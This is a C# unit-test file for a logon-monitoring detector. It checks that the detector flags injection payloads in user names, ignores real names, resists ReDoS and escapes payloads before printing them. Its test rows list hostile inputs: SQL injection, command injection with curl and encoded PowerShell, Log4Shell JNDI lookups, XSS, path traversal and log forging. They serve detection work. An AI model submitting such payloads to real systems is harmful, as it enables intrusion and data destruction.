using System.Diagnostics;
using LogonWatch.Detection;
using LogonWatch.Model;
using LogonWatch.Reporting;

namespace LogonWatch.Tests;

/**
 * WHAT:   Tests for InjectionAttemptRule.
 * WHY:    It must catch real attack payloads, never flag real people's
 *         names, and never be slowed down by a crafted name (ReDoS).
 */
public class InjectionTests
{
	/**
	 * WHAT:   Real payloads scanners send.
	 * WHY:    Each technique must be named correctly.
	 * PRE:    the parameters come from the InlineData rows below
	 * RETURN: nothing; the test fails if an assertion does not hold
	 */
	[Theory]
	[InlineData("admin' OR '1'='1", "SQL injection")]
	[InlineData("admin\" or 1=1--", "SQL injection")]
	[InlineData("x' ; DROP TABLE users", "SQL injection")]
	[InlineData("a' UNION SELECT password FROM users", "SQL injection")]
	[InlineData("'; WAITFOR DELAY '0:0:5'--", "SQL injection")]
	[InlineData("; whoami", "command injection")]
	[InlineData("admin && powershell -enc AAAA", "command injection")]
	[InlineData("$(curl 198.51.100.9)", "command injection")]
	[InlineData("${jndi:ldap://198.51.100.9/a}", "Log4Shell (JNDI lookup)")]
	[InlineData("${${lower:j}ndi:ldap://x}", "Log4Shell (JNDI lookup)")]
	[InlineData("<script>alert(1)</script>", "script injection")]
	[InlineData("<img src=x onerror=alert(1)>", "script injection")]
	[InlineData("..\\..\\windows\\system32", "path traversal")]
	[InlineData("%s%s%s%n", "format string")]
	[InlineData("admin\r\nlogonwatch: No attacks found.", "control characters")]
	public void DetectsPayloads(string user, string category)
	{
		Assert.Contains(category, InjectionAttemptRule.Categorize(user));
	}

	/**
	 * WHAT:   Real names with apostrophes, hyphens, dots, accents, e-mail form.
	 * WHY:    False alarms would bury real attacks.
	 * PRE:    the parameters come from the InlineData rows below
	 * RETURN: nothing; the test fails if an assertion does not hold
	 */
	[Theory]
	[InlineData("alice")]
	[InlineData("O'Brien")]
	[InlineData("d'Artagnan")]
	[InlineData("mary-jane")]
	[InlineData("first.last")]
	[InlineData("José Müller")]
	[InlineData("alice@corp.example")]
	[InlineData("svc_backup2")]
	[InlineData("Administrator")]
	public void IgnoresRealNames(string user)
	{
		Assert.Empty(InjectionAttemptRule.Categorize(user));
	}

	/**
	 * WHAT:   Several payloads from one source.
	 * WHY:    One alert per source listing every technique it tried.
	 * PRE:    none
	 * RETURN: nothing; the test fails if an assertion does not hold
	 */
	[Fact]
	public void GroupsBySource()
	{
		List<LogonEvent> events =
		[
			TestData.Failure(0, "admin' OR '1'='1", "192.0.2.66"),
			TestData.Failure(10, "${jndi:ldap://x/a}", "192.0.2.66"),
			TestData.Failure(20, "; whoami", "192.0.2.77"),
			TestData.Failure(30, "alice", "192.0.2.66"),
		];
		List<Alert> alerts = new InjectionAttemptRule().Evaluate(Detector.Prepare(events), new DetectionSettings()).ToList();

		Assert.Equal(2, alerts.Count);
		Alert first = alerts.Single(a => a.Source == "192.0.2.66");
		Assert.Equal(Severity.High, first.Severity);
		Assert.Equal(2, first.Attempts);
		Assert.Contains("SQL injection", first.Summary);
		Assert.Contains("Log4Shell", first.Summary);
	}

	/**
	 * WHAT:   A payload user name that logged on successfully.
	 * WHY:    Windows should never accept that: Critical.
	 * PRE:    none
	 * RETURN: nothing; the test fails if an assertion does not hold
	 */
	[Fact]
	public void AcceptedPayloadIsCritical()
	{
		Alert alert = Assert.Single(new InjectionAttemptRule().Evaluate([TestData.Success(0, "admin' OR '1'='1")], new DetectionSettings()));
		Assert.Equal(Severity.Critical, alert.Severity);
		Assert.Contains("investigate", alert.Summary);
	}

	/**
	 * WHAT:   A payload with a line break and an escape code.
	 * WHY:    Printed raw, it could forge lines in this report.
	 * PRE:    none
	 * RETURN: nothing; the test fails if an assertion does not hold
	 */
	[Fact]
	public void PayloadIsMadeSafeToPrint()
	{
		Assert.Equal("a\\r\\nb\\x1b[2J", InjectionAttemptRule.Shown("a\r\nb\u001b[2J"));
		Assert.EndsWith("...", InjectionAttemptRule.Shown(new string('x', 500)));
		Assert.Equal(43, InjectionAttemptRule.Shown(new string('x', 500)).Length);
	}

	/**
	 * WHAT:   A crafted name of 200,000 characters.
	 * WHY:    A backtracking regex could hang on this (ReDoS); this one must stay fast.
	 * PRE:    none
	 * RETURN: nothing; the test fails if an assertion does not hold
	 */
	[Fact]
	public void LongCraftedNameIsFast()
	{
		string crafted = string.Concat(Enumerable.Repeat("' or ", 40_000));
		Stopwatch timer = Stopwatch.StartNew();
		InjectionAttemptRule.Categorize(crafted);
		Assert.True(timer.Elapsed < TimeSpan.FromSeconds(2), $"took {timer.Elapsed}");
	}

	/**
	 * WHAT:   --redact with a payload.
	 * WHY:    Payloads are not personal data and must stay visible, or the rule goes blind.
	 * PRE:    none
	 * RETURN: nothing; the test fails if an assertion does not hold
	 */
	[Fact]
	public void RedactionKeepsPayloads()
	{
		Redactor redactor = new();
		Assert.Equal("admin' OR '1'='1", redactor.Redact(TestData.Failure(0, "admin' OR '1'='1")).User);
		Assert.Equal("user-1", redactor.Redact(TestData.Failure(1, "alice")).User);
	}
}
